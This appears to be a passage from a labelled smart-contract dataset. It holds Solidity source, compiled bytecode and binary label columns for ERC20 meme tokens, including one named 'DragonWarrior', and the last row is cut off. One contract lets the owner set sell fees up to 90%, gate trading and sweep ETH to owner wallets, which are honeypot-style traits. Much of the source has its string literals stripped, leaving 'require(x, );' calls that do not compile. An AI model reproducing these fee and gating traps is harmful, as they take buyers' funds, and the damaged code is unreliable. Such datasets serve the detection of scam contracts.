ethForLiquidity); emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity); } (success,) = address(marketingWallet).call{value: address(this).balance}(); }}",0x6080604052600436106102b25760003560e01c80638a8c523c11610175578063bbc0c742116100dc578063d85ba06311610095578063f11a24d31161006f578063f11a24d314610888578063f2fde38b1461089e578063f6374342146108be578063f8b45b05146108d457600080fd5b8063d85ba06314610816578063dd62ed3e1461082c578063e2f456051461087257600080fd5b8063bbc0c74214610761578063c024666814610780578063c17b5b8c146107a0578063c18bc195146107c0578063c8c8ebe4146107e0578063d257b34f146107f657600080fd5b80639c3b4fdc1161012e5780639c3b4fdc146106bf5780639fccce32146106d5578063a0d82dc5146106eb578063a457c2d714610701578063a9059cbb14610721578063aacebbe31461074157600080fd5b80638a8c523c146106115780638da5cb5b146106265780639213691314610644578063924de9b71461065a57806395c336521461067a57806395d89b41146106aa57600080fd5b8063395093511161021957806370a08231116101d257806370a082311461055b578063715018a614610591578063751039fc146105a65780637571336a146105bb5780637bce5a04146105db5780638095d564146105f157600080fd5b8063395093511461047e57806349bd5a5e1461049e5780634a62bb65146104d25780634fbee193146104ec5780636a486a8e146105255780636ddd17131461053b57600080fd5b80631a8145bb1161026b5780631a8145bb146103d65780631a89e947146103ec5780631f3fed8f1461040c578063203e727e1461042257806323b872dd14610442578063313ce5671461046257600080fd5b806306fdde03146102be578063095ea7b3146102e957806310d5de53146103195780631694505e1461034957806318160ddd146103955780631816467f146103b457600080fd5b366102b957005b600080fd5b3480156102ca57600080fd5b506102d36108ea565b6040516102e0919061240a565b60405180910390f35b3480156102f557600080fd5b50610309610304366004612470565b61097c565b60405190151581526020016102e0565b34801561032557600080fd5b5061030961033436600461249c565b60196020526000908152604090205460ff1681565b34801561035557600080fd5b5061037d7f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d81565b6040516001600160a01b0390911681526020016102e0565b3480156103a157600080fd5b506002545b6040519081526020016102e0565b3480156103c057600080fd5b506103d46103cf36600461249c565b610993565b005b3480156103e257600080fd5b506103a660155481565b3480156103f857600080fd5b506103d46104073660046124c9565b610a23565b34801561041857600080fd5b506103a660145481565b34801561042e57600080fd5b506103d461043d3660046124fe565b610aed565b34801561044e57600080fd5b5061030961045d366004612517565b610bca565b34801561046e57600080fd5b50604051601281526020016102e0565b34801561048a57600080fd5b50610309610499366004612470565b610c33565b3480156104aa57600080fd5b5061037d7f0000000000000000000000002f329cec821918f16da9196f84ffc54eda42764b81565b3480156104de57600080fd5b50600b546103099060ff1681565b3480156104f857600080fd5b5061030961050736600461249c565b6001600160a01b031660009081526018602052604090205460ff1690565b34801561053157600080fd5b506103a660105481565b34801561054757600080fd5b50600b546103099062010000900460ff1681565b34801561056757600080fd5b506103a661057636600461249c565b6001600160a01b031660009081526020819052604090205490565b34801561059d57600080fd5b506103d4610c69565b3480156105b257600080fd5b50610309610cdd565b3480156105c757600080fd5b506103d46105d63660046124c9565b610d1a565b3480156105e757600080fd5b506103a6600d5481565b3480156105fd57600080fd5b506103d461060c366004612558565b610d6f565b34801561061d57600080fd5b506103d4610e17565b34801561063257600080fd5b506005546001600160a01b031661037d565b34801561065057600080fd5b506103a660115481565b34801561066657600080fd5b506103d4610675366004612584565b610e58565b34801561068657600080fd5b5061030961069536600461249c565b601a6020526000908152604090205460ff1681565b3480156106b657600080fd5b506102d3610e9e565b3480156106cb57600080fd5b506103a6600f5481565b3480156106e157600080fd5b506103a660165481565b3480156106f757600080fd5b506103a660135481565b34801561070d57600080fd5b5061030961071c366004612470565b610ead565b34801561072d57600080fd5b5061030961073c366004612470565b610efc565b34801561074d57600080fd5b506103d461075c36600461249c565b610f09565b34801561076d57600080fd5b50600b5461030990610100900460ff1681565b34801561078c57600080fd5b506103d461079b3660046124c9565b610f90565b3480156107ac57600080fd5b506103d46107bb366004612558565b611019565b3480156107cc57600080fd5b506103d46107db3660046124fe565b6110bc565b3480156107ec57600080fd5b506103a660085481565b34801561080257600080fd5b506103096108113660046124fe565b61118d565b34801561082257600080fd5b506103a6600c5481565b34801561083857600080fd5b506103a661084736600461259f565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b34801561087e57600080fd5b506103a660095481565b34801561089457600080fd5b506103a6600e5481565b3480156108aa57600080fd5b506103d46108b936600461249c565b6112e4565b3480156108ca57600080fd5b506103a660125481565b3480156108e057600080fd5b506103a6600a5481565b6060600380546108f9906125d8565b80601f0160208091040260200160405190810160405280929190818152602001828054610925906125d8565b80156109725780601f1061094757610100808354040283529160200191610972565b820191906000526020600020905b81548152906001019060200180831161095557829003601f168201915b5050505050905090565b6000610989338484611435565b5060015b92915050565b6005546001600160a01b031633146109c65760405162461bcd60e51b81526004016109bd90612612565b60405180910390fd5b6007546040516001600160a01b03918216918316907f90b8024c4923d3873ff5b9fcb43d0360d4b9217fa41225d07ba379993552e74390600090a3600780546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314610a4d5760405162461bcd60e51b81526004016109bd90612612565b7f0000000000000000000000002f329cec821918f16da9196f84ffc54eda42764b6001600160a01b0316826001600160a01b031603610adf5760405162461bcd60e51b815260206004820152602860248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d20604482015267706172746e65727360c01b60648201526084016109bd565b610ae9828261155a565b5050565b6005546001600160a01b03163314610b175760405162461bcd60e51b81526004016109bd90612612565b670de0b6b3a76400006103e8610b2c60025490565b610b3790600161265d565b610b419190612674565b610b4b9190612674565b811015610bb25760405162461bcd60e51b815260206004820152602f60248201527f43616e6e6f7420736574206d61785472616e73616374696f6e416d6f756e742060448201526e6c6f776572207468616e20302e312560881b60648201526084016109bd565b610bc481670de0b6b3a764000061265d565b60085550565b6000610bd78484846115ae565b610c298433610c248560405180606001604052806028815260200161283d602891396001600160a01b038a1660009081526001602090815260408083203384529091529020549190611cb9565b611435565b5060019392505050565b3360008181526001602090815260408083206001600160a01b03871684529091528120549091610989918590610c2490866113cf565b6005546001600160a01b03163314610c935760405162461bcd60e51b81526004016109bd90612612565b6005546040516000916001600160a01b0316907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600580546001600160a01b0319169055565b6005546000906001600160a01b03163314610d0a5760405162461bcd60e51b81526004016109bd90612612565b50600b805460ff19169055600190565b6005546001600160a01b03163314610d445760405162461bcd60e51b81526004016109bd90612612565b6001600160a01b03919091166000908152601960205260409020805460ff1916911515919091179055565b6005546001600160a01b03163314610d995760405162461bcd60e51b81526004016109bd90612612565b600f839055600e829055600d81905580610db38385612696565b610dbd9190612696565b600c819055600a1015610e125760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420313025206f72206c65737300000060448201526064016109bd565b505050565b6005546001600160a01b03163314610e415760405162461bcd60e51b81526004016109bd90612612565b600b805462ffff0019166201010017905543601755565b6005546001600160a01b03163314610e825760405162461bcd60e51b81526004016109bd90612612565b600b8054911515620100000262ff000019909216919091179055565b6060600480546108f9906125d8565b60006109893384610c2485604051806060016040528060258152602001612865602591393360009081526001602090815260408083206001600160a01b038d1684529091529020549190611cb9565b60006109893384846115ae565b6005546001600160a01b03163314610f335760405162461bcd60e51b81526004016109bd90612612565b6006546040516001600160a01b03918216918316907fa751787977eeb3902e30e1d19ca00c6ad274a1f622c31a206e32366700b0567490600090a3600680546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314610fba5760405162461bcd60e51b81526004016109bd90612612565b6001600160a01b038216600081815260186020908152604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6005546001600160a01b031633146110435760405162461bcd60e51b81526004016109bd90612612565b6013839055601282905560118190558061105d8385612696565b6110679190612696565b6010819055605a1015610e125760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420393025206f72206c65737300000060448201526064016109bd565b6005546001600160a01b031633146110e65760405162461bcd60e51b81526004016109bd90612612565b670de0b6b3a76400006103e86110fb60025490565b61110690600561265d565b6111109190612674565b61111a9190612674565b8110156111755760405162461bcd60e51b8152602060048201526024808201527f43616e6e6f7420736574206d617857616c6c6574206c6f776572207468616e20604482015263302e352560e01b60648201526084016109bd565b61118781670de0b6b3a764000061265d565b600a5550565b6005546000906001600160a01b031633146111ba5760405162461bcd60e51b81526004016109bd90612612565b620186a06111c760025490565b6111d290600161265d565b6111dc9190612674565b8210156112495760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b60648201526084016109bd565b6103e861125560025490565b61126090600561265d565b61126a9190612674565b8211156112d65760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171a92903a37ba30b61039bab838363c9760611b60648201526084016109bd565b50600981905560015b919050565b6005546001600160a01b0316331461130e5760405162461bcd60e51b81526004016109bd90612612565b6001600160a01b0381166113735760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016109bd565b6005546040516001600160a01b038084169216907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0319166001600160a01b0392909216919091179055565b6000806113dc8385612696565b90508381101561142e5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016109bd565b9392505050565b6001600160a01b0383166114975760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016109bd565b6001600160a01b0382166114f85760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016109bd565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b0382166000818152601a6020526040808220805460ff191685151590811790915590519092917f86866eb41d8e92d6c25444e7c64d1afbb6521f9f48efd135bf4299ef7f9ce47591a35050565b6001600160a01b0383166115d45760405162461bcd60e51b81526004016109bd906126a9565b6001600160a01b0382166115fa5760405162461bcd60e51b81526004016109bd906126ee565b8060000361160e57610e1283836000611cf3565b600b5460ff1615611984576005546001600160a01b0384811691161480159061164557506005546001600160a01b03838116911614155b801561165957506001600160a01b03821615155b801561167057506001600160a01b03821661dead14155b80156116865750600554600160a01b900460ff16155b1561198457600b54610100900460ff1661171e576001600160a01b03831660009081526018602052604090205460ff16806116d957506001600160a01b03821660009081526018602052604090205460ff165b61171e5760405162461bcd60e51b81526020600482015260166024820152752a3930b234b7339034b9903737ba1030b1ba34bb329760511b60448201526064016109bd565b6001600160a01b0383166000908152601a602052604090205460ff16801561175f57506001600160a01b03821660009081526019602052604090205460ff16155b15611843576008548111156117d45760405162461bcd60e51b815260206004820152603560248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201527436b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760591b60648201526084016109bd565b600a546001600160a01b0383166000908152602081905260409020546117fa9083612696565b111561183e5760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b60448201526064016109bd565b611984565b6001600160a01b0382166000908152601a602052604090205460ff16801561188457506001600160a01b03831660009081526019602052604090205460ff16155b156118fa5760085481111561183e5760405162461bcd60e51b815260206004820152603660248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152751036b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760511b60648201526084016109bd565b6001600160a01b03821660009081526019602052604090205460ff1661198457600a546001600160a01b0383166000908152602081905260409020546119409083612696565b11156119845760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b60448201526064016109bd565b30600090815260208190526040902054600954811080159081906119b05750600b5462010000900460ff165b80156119c65750600554600160a01b900460ff16155b80156119eb57506001600160a01b0385166000908152601a602052604090205460ff16155b8015611a1057506001600160a01b03851660009081526018602052604090205460ff16155b8015611a3557506001600160a01b03841660009081526018602052604090205460ff16155b15611a63576005805460ff60a01b1916600160a01b179055611a55611dfc565b6005805460ff60a01b191690555b6005546001600160a01b03861660009081526018602052604090205460ff600160a01b909204821615911680611ab157506001600160a01b03851660009081526018602052604090205460ff165b15611aba575060005b60008115611ca5576001600160a01b0386166000908152601a602052604090205460ff168015611aec57506000601054115b15611baa57611b116064611b0b6010548861203690919063ffffffff16565b906120b8565b905060105460125482611b24919061265d565b611b2e9190612674565b60156000828254611b3f9190612696565b9091555050601054601354611b54908361265d565b611b5e9190612674565b60166000828254611b6f9190612696565b9091555050601054601154611b84908361265d565b611b8e9190612674565b60146000828254611b9f9190612696565b90915550611c879050565b6001600160a01b0387166000908152601a602052604090205460ff168015611bd457506000600c54115b15611c8757611bf36064611b0b600c548861203690919063ffffffff16565b9050600c54600e5482611c06919061265d565b611c109190612674565b60156000828254611c219190612696565b9091555050600c54600f54611c36908361265d565b611c409190612674565b60166000828254611c519190612696565b9091555050600c54600d54611c66908361265d565b611c709190612674565b60146000828254611c819190612696565b90915550505b8015611c9857611c98873083611cf3565b611ca28186612731565b94505b611cb0878787611cf3565b50505050505050565b60008184841115611cdd5760405162461bcd60e51b81526004016109bd919061240a565b506000611cea8486612731565b95945050505050565b6001600160a01b038316611d195760405162461bcd60e51b81526004016109bd906126a9565b6001600160a01b038216611d3f5760405162461bcd60e51b81526004016109bd906126ee565b611d7c81604051806060016040528060268152602001612817602691396001600160a01b0386166000908152602081905260409020549190611cb9565b6001600160a01b038085166000908152602081905260408082209390935590841681522054611dab90826113cf565b6001600160a01b038381166000818152602081815260409182902094909455518481529092918616917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910161154d565b3060009081526020819052604081205490506000601654601454601554611e239190612696565b611e2d9190612696565b90506000821580611e3c575081155b15611e4657505050565b600954611e5490601461265d565b831115611e6c57600954611e6990601461265d565b92505b600060028360155486611e7f919061265d565b611e899190612674565b611e939190612674565b90506000611ea185836120fa565b905047611ead8261213c565b6000611eb947836120fa565b90506000611ed687611b0b6014548561203690919063ffffffff16565b90506000611ef388611b0b6016548661203690919063ffffffff16565b9050600081611f028486612731565b611f0c9190612731565b60006015819055601481905560168190556007546040519293506001600160a01b031691849181818185875af1925050503d8060008114611f69576040519150601f19603f3d011682016040523d82523d6000602084013e611f6e565b606091505b50909850508615801590611f825750600081115b15611fd557611f9187826122fc565b601554604080518881526020810184905280820192909252517f17bbfb9a6069321b6ded73bd96327c9e6b7212a5cd51ff219cd61370acafb5619181900360600190a15b6006546040516001600160a01b03909116904790600081818185875af1925050503d8060008114612022576040519150601f19603f3d011682016040523d82523d6000602084013e612027565b606091505b50505050505050505050505050565b6000826000036120485750600061098d565b6000612054838561265d565b9050826120618583612674565b1461142e5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016109bd565b600061142e83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506123dc565b600061142e83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611cb9565b604080516002808252606082018352600092602083019080368337019050509050308160008151811061217157612171612744565b60200260200101906001600160a01b031690816001600160a01b0316815250507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156121ef573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612213919061275a565b8160018151811061222657612226612744565b60200260200101906001600160a01b031690816001600160a01b031681525050612271307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84611435565b60405163791ac94760e01b81526001600160a01b037f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d169063791ac947906122c6908590600090869030904290600401612777565b600060405180830381600087803b1580156122e057600080fd5b505af11580156122f4573d6000803e3d6000fd5b505050505050565b612327307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84611435565b60405163f305d71960e01b8152306004820181905260248201849052600060448301819052606483015260848201524260a48201527f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b03169063f305d71990839060c40160606040518083038185885af11580156123b0573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906123d591906127e8565b5050505050565b600081836123fd5760405162461bcd60e51b81526004016109bd919061240a565b506000611cea8486612674565b600060208083528351808285015260005b818110156124375785810183015185820160400152820161241b565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461246d57600080fd5b50565b6000806040838503121561248357600080fd5b823561248e81612458565b946020939093013593505050565b6000602082840312156124ae57600080fd5b813561142e81612458565b803580151581146112df57600080fd5b600080604083850312156124dc57600080fd5b82356124e781612458565b91506124f5602084016124b9565b90509250929050565b60006020828403121561251057600080fd5b5035919050565b60008060006060848603121561252c57600080fd5b833561253781612458565b9250602084013561254781612458565b929592945050506040919091013590565b60008060006060848603121561256d57600080fd5b505081359360208301359350604090920135919050565b60006020828403121561259657600080fd5b61142e826124b9565b600080604083850312156125b257600080fd5b82356125bd81612458565b915060208301356125cd81612458565b809150509250929050565b600181811c908216806125ec57607f821691505b60208210810361260c57634e487b7160e01b600052602260045260246000fd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b808202811582820484141761098d5761098d612647565b60008261269157634e487b7160e01b600052601260045260246000fd5b500490565b8082018082111561098d5761098d612647565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b8181038181111561098d5761098d612647565b634e487b7160e01b600052603260045260246000fd5b60006020828403121561276c57600080fd5b815161142e81612458565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156127c75784516001600160a01b0316835293830193918301916001016127a2565b50506001600160a01b03969096166060850152505050608001529392505050565b6000806000606084860312156127fd57600080fd5b835192506020840151915060408401519050925092509256fe45524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa2646970667358221220ed57054b48f1859d3bc6e82762f53bb5c682e5c31cc3f641540693b84005e1bc64736f6c63430008110033,0,0,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0
"pragma solidity >=0.8.10;interface IUniswapV2Pair { event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); function name() external pure returns (string memory); function symbol() external pure returns (string memory); function decimals() external pure returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address owner) external view returns (uint); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint value) external returns (bool); function transfer(address to, uint value) external returns (bool); function transferFrom(address from, address to, uint value) external returns (bool); function DOMAIN_SEPARATOR() external view returns (bytes32); function PERMIT_TYPEHASH() external pure returns (bytes32); function nonces(address owner) external view returns (uint); function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); function MINIMUM_LIQUIDITY() external pure returns (uint); function factory() external view returns (address); function token0() external view returns (address); function token1() external view returns (address); function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); function price0CumulativeLast() external view returns (uint); function price1CumulativeLast() external view returns (uint); function kLast() external view returns (uint); function mint(address to) external returns (uint liquidity); function burn(address to) external returns (uint amount0, uint amount1); function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; function skim(address to) external; function sync() external; function initialize(address, address) external;}interface IUniswapV2Factory { event PairCreated(address indexed token0, address indexed token1, address pair, uint); function feeTo() external view returns (address); function feeToSetter() external view returns (address); function getPair(address tokenA, address tokenB) external view returns (address pair); function allPairs(uint) external view returns (address pair); function allPairsLength() external view returns (uint); function createPair(address tokenA, address tokenB) external returns (address pair); function setFeeTo(address) external; function setFeeToSetter(address) external;}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { this; return msg.data; }}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}library SafeMathInt { int256 private constant MIN_INT256 = int256(1) << 255; int256 private constant MAX_INT256 = ~(int256(1) << 255); function mul(int256 a, int256 b) internal pure returns (int256) { int256 c = a * b; require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256)); require((b == 0) || (c / b == a)); return c; } function div(int256 a, int256 b) internal pure returns (int256) { require(b != -1 || a != MIN_INT256); return a / b; } function sub(int256 a, int256 b) internal pure returns (int256) { int256 c = a - b; require((b >= 0 && c <= a) || (b < 0 && c > a)); return c; } function add(int256 a, int256 b) internal pure returns (int256) { int256 c = a + b; require((b >= 0 && c >= a) || (b < 0 && c < a)); return c; } function abs(int256 a) internal pure returns (int256) { require(a != MIN_INT256); return a < 0 ? -a : a; } function toUint256Safe(int256 a) internal pure returns (uint256) { require(a >= 0); return uint256(a); }}library SafeMathUint { function toInt256Safe(uint256 a) internal pure returns (int256) { int256 b = int256(a); require(b >= 0); return b; }}interface IUniswapV2Router01 { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB); function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH); function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB); function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH); function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB); function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut); function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn); function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts); function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);}interface IUniswapV2Router02 is IUniswapV2Router01 { function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH); function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;}contract DragonWarrior is Context, IERC20, IERC20Metadata, Ownable { using SafeMath for uint256; uint256 private _totalSupply; string private _name; string private _symbol; mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _basicTransfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {} IUniswapV2Router02 public immutable uniswapV2Router; address public immutable uniswapV2Pair; address public constant deadAddress = address(0xdead); bool private swapping; address treasuryWallet; address devAddress; uint256 public maxTransactionAmount; uint256 public swapTokensAtAmount; uint256 public maxWallet; uint256 public percentForLPBurn = 25; bool public lpBurnEnabled = false; uint256 public lpBurnFrequency = 3600 seconds; uint256 public lastLpBurnTime; uint256 public manualBurnFrequency = 30 minutes; uint256 public lastManualLpBurnTime; bool public limitsInEffect = true; bool public tradingActive = false; bool public swapEnabled = false; mapping(address => uint256) private _holderLastTransferTimestamp; mapping(address => uint256) public _earlyTransferBlock; bool public transferDelayEnabled = true; address public addressToSwap; uint256 public buyTotalFees; uint256 public buyTreasuryFee; uint256 public buyLiquidityFee; uint256 public buyDevFee; uint256 public sellTotalFees; uint256 public sellTreasuryFee; uint256 public sellLiquidityFee; uint256 public sellDevFee; uint256 public tokensForTreasury; uint256 public tokensForLiquidity; uint256 public tokensForDev; mapping (address => bool) private _isExcludedFromFees; mapping (address => bool) public _isExcludedMaxTransactionAmount; mapping (address => bool) public automatedMarketMakerPairs; event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress); event ExcludeFromFees(address indexed account, bool isExcluded); event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value); event treasuryWalletUpdated(address indexed newWallet, address indexed oldWallet); event devWalletUpdated(address indexed newWallet, address indexed oldWallet); event SwapAndLiquify( uint256 tokensSwapped, uint256 